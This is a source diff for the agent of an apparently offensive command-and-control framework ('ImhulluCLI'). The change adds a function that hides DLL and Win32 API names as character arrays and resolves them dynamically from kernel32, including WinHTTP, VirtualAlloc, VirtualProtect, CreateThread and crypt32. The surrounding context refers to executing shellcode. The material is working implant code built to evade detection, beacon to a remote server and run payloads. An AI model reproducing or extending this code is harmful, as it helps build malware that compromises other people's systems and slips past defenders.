@@ -2,6 +2,7 @@
 #include "../include/std.h"
 #include "../include/typedefs.h"
 #include "../include/http.h"
+#include "../include/addresshunter.h"
 
 // will be overwritten by ImhulluCLI
 // ImhulluCLI defines these macros when it compiles the agent
@@ -16,7 +17,8 @@
 #define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
 #endif
 
-
+static API Api = {0};
+static PAPI api = &Api;
 
 /**
  * @fn Agent* AgentAllocate
@@ -83,8 +85,10 @@ Agent* AgentAllocate(MALLOC malloc)
  * @note If population of a member fails, the function returns FALSE and all the members are considered uninitialized
  * @note Allocate the struct with `AgentAllocate` and free the agent with `AgentFree`
  */
-BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength, _In_ CONST INTERNET_PORT remotePort, _In_ CONST AGENT_INTERVAL interval, _In_ PAPI api)
+BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength, _In_ CONST INTERNET_PORT remotePort, _In_ CONST AGENT_INTERVAL interval)
 {
+    populate_api();
+
     // if agent pointer is NULL, exit
     if (agent == NULL)
     {
@@ -127,7 +131,7 @@ BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE
         return FALSE;
     }
 
-    if (AgentApiSet(agent, api) == FALSE)
+    if (AgentApiSet(agent) == FALSE)
     {
         DEBUG_PRINTF_ERROR("%s", "AgentPopulate: AgentApiSet failed\n");
         return FALSE;
@@ -334,7 +338,7 @@ BOOL AgentIntervalSet(_Inout_ Agent* agent, _In_ AGENT_INTERVAL interval)
  * @note: make sure Win32 api functions in `api` is initialized
  * @note: If the function fails, the `api` member remains unchanged
  */
-BOOL AgentApiSet(_Out_ Agent* agent, _In_ PAPI api)
+BOOL AgentApiSet(_Out_ Agent* agent)
 {
     if (agent == NULL)
     {
@@ -745,5 +749,109 @@ BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pT
 
     ((FREE)agent->api->free)(shellcode);
     return TRUE;
+}
+
+void populate_api()
+{
+    // Library Names
+    CHAR user32_c[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
+    CHAR winhttp_c[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', 0 };
+    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', 0 };
+    CHAR crypt32_c[] = { 'c', 'r', 'y', 'p', 't', '3', '2', '.', 'd', 'l', 'l', 0 };
+    CHAR shlwapi_c[] = { 's', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };
+
+    // Library Declarations
+    UINT64 kernel32dll, winhttpdll, msvcrtdll, user32dll, crypt32dll, shlwapidll;
+ 
+    // Function Names
+    CHAR messageBoxA_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
+    CHAR messageBoxW_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0 };
+    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
+    CHAR winHttpOpen_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
+    CHAR winHttpConnect_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
+    CHAR winHttpOpenRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
+    CHAR winHttpSendRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
+    CHAR winHttpReceiveResponse_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0 };
+    CHAR WinHttpQueryDataAvailable_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0 };
+    CHAR winHttpQueryHeaders_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0 };
+    CHAR winHttpReadData_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
+    CHAR winHttpCloseHandle_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
+    CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0 };
+    #ifdef DEBUG
+    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0 };
+    CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };
+    #endif
+    CHAR snprintf_c[] = { '_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0 };
+    CHAR malloc_c[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
+    CHAR calloc_c[] = { 'c', 'a', 'l', 'l', 'o', 'c', 0 };
+    CHAR free_c[] = { 'f', 'r', 'e', 'e', 0 };
+    CHAR virtualProtect_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
+    CHAR virtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
+    CHAR createThread_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
+    CHAR waitForSingleObject_c[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
+    CHAR CryptStringToBinaryA_c[] = { 'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0 };
+    CHAR CryptBinaryToStringA_c[] = { 'C', 'r', 'y', 'p', 't', 'B', 'i', 'n', 'a', 'r', 'y', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'A', 0 };
+    CHAR StrToIntW_c[] = { 'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0 };
+    CHAR closeHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
+    CHAR sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0 };
+    CHAR exitThread_c[] = { 'E', 'x', 'i', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
+
+    // Get Kernel32
+    kernel32dll = GetKernel32();
+    // GetLoadLibraryA
+    api->LoadLibraryA = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
+
+    // Getting Libraries
+    user32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(user32_c);
+    msvcrtdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(msvcrt_c);
+    winhttpdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(winhttp_c);
+    crypt32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(crypt32_c);
+    shlwapidll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(shlwapi_c);
+
+    // WinHTTP
+    api->WinHttpConnect = GetSymbolAddress((HANDLE)winhttpdll, winHttpConnect_c);
+    api->WinHttpOpen = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpen_c);
+    api->WinHttpOpenRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpenRequest_c);
+    api->WinHttpSendRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpSendRequest_c);
+    api->WinHttpReceiveResponse = GetSymbolAddress((HANDLE)winhttpdll, winHttpReceiveResponse_c);
+    api->WinHttpQueryDataAvailable = GetSymbolAddress((HANDLE) winhttpdll, WinHttpQueryDataAvailable_c);
+    api->WinHttpQueryHeaders = GetSymbolAddress((HANDLE)winhttpdll, winHttpQueryHeaders_c);
+    api->WinHttpReadData = GetSymbolAddress((HANDLE)winhttpdll, winHttpReadData_c);
+    api->WinHttpCloseHandle = GetSymbolAddress((HANDLE)winhttpdll, winHttpCloseHandle_c);
+
+    // Getting functions
+    // User32
+    // Msvcrt
+    // kernel32
+    api->malloc = GetSymbolAddress((HANDLE)msvcrtdll, malloc_c);
+    api->calloc = GetSymbolAddress((HANDLE)msvcrtdll, calloc_c);
+    api->free = GetSymbolAddress((HANDLE)msvcrtdll, free_c);
+    api->GetLastError = GetSymbolAddress((HANDLE)kernel32dll, getLastError_c);
+    api->MessageBoxA = GetSymbolAddress((HANDLE)user32dll, messageBoxA_c);
+    api->MessageBoxW = GetSymbolAddress((HANDLE)user32dll, messageBoxW_c);
+    #ifdef DEBUG
+    api->wprintf = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
+    api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
+    #endif
+    api->snprintf = GetSymbolAddress((HANDLE)msvcrtdll, snprintf_c);
+    api->VirtualProtect = GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
+    api->VirtualAlloc = GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c);
+    api->CreateThread = GetSymbolAddress((HANDLE)kernel32dll, createThread_c);
+    api->WaitForSingleObject = GetSymbolAddress((HANDLE)kernel32dll, waitForSingleObject_c);
+    api->CloseHandle = GetSymbolAddress((HANDLE)kernel32dll, closeHandle_c);
+    api->Sleep = GetSymbolAddress((HANDLE)kernel32dll, sleep_c);
+    api->ExitThread = GetSymbolAddress((HANDLE)kernel32dll, exitThread_c);
+
+    // crypt32
+    api->CryptStringToBinaryA = GetSymbolAddress((HANDLE)crypt32dll, CryptStringToBinaryA_c);
+    api->CryptBinaryToStringA = GetSymbolAddress((HANDLE)crypt32dll, CryptBinaryToStringA_c);
+
+    // shlwapi
+    api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);
+}
+
+PAPI inject_api()
+{
+    return api;
 }
 
